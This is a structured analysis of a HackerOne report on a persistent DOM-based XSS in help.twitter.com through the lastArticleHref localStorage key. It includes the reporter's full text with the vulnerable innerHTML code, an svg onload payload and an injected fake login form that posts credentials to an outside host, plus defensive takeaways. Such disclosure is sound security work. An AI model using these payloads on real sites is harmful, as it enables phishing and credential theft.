# Persistent DOM-based XSS in help.twitter.com via localStorage

## Metadata
- **Source:** HackerOne
- **Report:** 297968 | https://hackerone.com/reports/297968
- **Submitted:** 2017-12-14
- **Reporter:** harisec
- **Program:** Twitter/X
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** DOM-based XSS, Persistent XSS, Unsafe innerHTML, localStorage injection
- **CVEs:** None
- **Category:** web-api

## Summary
A persistent DOM-based XSS vulnerability exists in help.twitter.com where the lastArticleHref localStorage key is used to dynamically generate HTML without proper encoding, allowing attackers to inject malicious code via URL fragments. The vulnerability persists across sessions as localStorage retains the malicious payload, enabling phishing attacks and credential theft.

## Attack scenario
1. Attacker crafts a malicious URL containing XSS payload in the fragment (e.g., https://help.twitter.com/en/using-twitter/follow-requests#\"><svg/onload=alert(1)>)
2. Attacker sends the crafted URL to victim via email, chat, or social engineering
3. Victim clicks the link, which stores the XSS payload in the lastArticleHref localStorage key
4. Victim navigates to help.twitter.com homepage or any page triggering breadcrumb rendering
5. JavaScript code retrieves lastArticleHref from localStorage and concatenates it unsafely into HTML
6. Malicious code executes in victim's browser context, enabling credential theft, session hijacking, or further exploitation

## Root cause
The JavaScript code in homepage.js uses unsafe innerHTML assignment with unsanitized user-controlled input from localStorage. Specifically, the lastArticleHref value is concatenated directly into an HTML string without URL encoding or HTML entity encoding before being written to the DOM via innerHTML.

## Attacker mindset
An attacker would recognize that localStorage is persistent and accessible across page navigations, making it ideal for storing XSS payloads. They would leverage URL fragments to bypass initial validation and craft payloads that break out of HTML attributes, allowing arbitrary HTML/JavaScript injection. The attacker would target help.twitter.com specifically because it's a support domain likely trusted by users, making phishing attacks more credible.

## Defensive takeaways
- Never use innerHTML with user-controlled or external data; use textContent or DOM methods instead
- Implement strict Content Security Policy (CSP) with nonce-based inline scripts and no unsafe-inline directives
- Always HTML-encode user input when inserting into DOM, especially in HTML attribute contexts
- Validate and sanitize localStorage data on retrieval, treating it as untrusted user input
- Use URL parsing APIs to extract and validate URL components rather than string manipulation
- Implement input validation on URL parameters and fragments at the application level
- Use DOMPurify or similar libraries for sanitizing HTML content when innerHTML must be used
- Apply X-XSS-Protection and X-Content-Type-Options headers for defense-in-depth

## Variant hunting
Search for other uses of localStorage values in innerHTML/insertAdjacentHTML across Twitter properties
Check for similar breadcrumb rendering patterns using sessionStorage or other storage mechanisms
Hunt for unsafe concatenation of lastArticleHref or similar tracking variables in template literals
Audit other Twitter help documentation sites and language-specific variants for identical code patterns
Look for other localStorage keys being used in dynamic HTML generation without sanitization
Test other URL parameters and fragments beyond #lastArticleHref for similar persistence mechanisms

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1056

## Notes
Report demonstrates clear understanding of XSS vector chain involving URL fragments, localStorage persistence, and unsafe DOM manipulation. CSP was reportedly present but ineffective, suggesting it may have allowed unsafe-inline or had other bypasses. The attacker provided two proof-of-concept methods: silent credential harvesting (Chrome) and obvious JavaScript execution (IE11), demonstrating impact severity. The vulnerability's persistence across sessions and ability to target help.twitter.com specifically made it particularly dangerous for phishing campaigns.

## Full report
<details><summary>Expand</summary>

**Summary:** 

I've found a DOM-based XSS vulnerability in the website **help.twitter.com** that persists via a localStorage key **lastArticleHref**. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.

**Description:** 

The website **help.twitter.com** contains JavaScript code that will save the value of the current page (the value of the browser property **location.href**) into a localStorage key named **lastArticleBreadcrumbs**.

The JavaScript code is loaded from this URL:
https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js

There are two relevant localStorage keys:
*  **lastArticleBreadcrumbs** - that contains an array of breadcrumbs such as `["Help Center"," Following and unfollowing"," How to approve or deny follower requests"]`
*  **lastArticleHref** -  that contains the URL of the last visited article

When these two localStorage keys are present, the following code is executed:

```
this.lastArticleBreadcrumbs.shift();
                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {
                        return r === e.lastArticleBreadcrumbs.length - 1 ? '<a class="hp03__link  twtr-type--roman-16" href="' + e.lastArticleHref + '">' + t + "</a>" : '<span class="hp03__breadcrumb  twtr-color--light-gray-neutral">' + t + "</span>"
                    });
                    this.breadcrumbElement.innerHTML = t.join('<span class="hp03__seperator    twtr-color--light-gray-neutral">/</span>')
```

As you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable **e.lastArticleHref**. This variable is loaded from the localStorage key **lastArticleHref**.

The value of **e.lastArticleHref** is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via `this.breadcrumbElement.innerHTML`.

This allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key **lastArticleHref**.

The exploit scenario is as follows:

1. The victim visits an URL like `https://help.twitter.com/en/using-twitter/follow-requests#"><zzzz>`
2. The JavaScript code from the page will set the value of localStorage key **lastArticleHref** to `https://help.twitter.com/en/using-twitter/follow-requests#\"><zzzz>`.
3. The user visits the homepage `https://help.twitter.com/`.
4. At this point the value of the localStorage key **lastArticleHref** is loaded and used to dynamically generate some HTML code that is written into the DOM.
5. The victim can now open a new window/tab and visit `https://help.twitter.com/`. The HTML code set by attacker will appear in the page as the value of the localStorage key **lastArticleHref** will remain set to an XSS payload.

I was not able to bypass CSP and I've prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.

## Steps To Reproduce:

I've attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.

### Chrome
To reproduce, using Google Chrome follow the next steps:

* Visit the following URL using Google Chrome:

```
https://help.twitter.com/en/using-twitter/follow-requests#"></a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bugs.thx.bz/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>
```

* At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.
* Visit the homepage https://help.twitter.com/
* A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain **bugs.thx.bz**.

### Internet Explorer 11

To reproduce, using Internet Explorer follow the next steps:

* Visit the following URL using Internet Explorer 11:

```
https://help.twitter.com/en/using-twitter/follow-requests#"><svg/onload=alert(1)>
```

* At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.
* Visit the homepage https://help.twitter.com/
* A popup should appear as proof that JavaScript execution is possible.

## Supporting Material/References:

I've attached two movies to this report.
*  One demonstrating the issue using Google Chrome and the login form.
*  Another one using IE11 to execute JavaScript code in the context of the domain **help.twitter.com**.

## Impact

An attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim's credentials.

</details>

---
*Analysed by Claude on 2026-05-12*
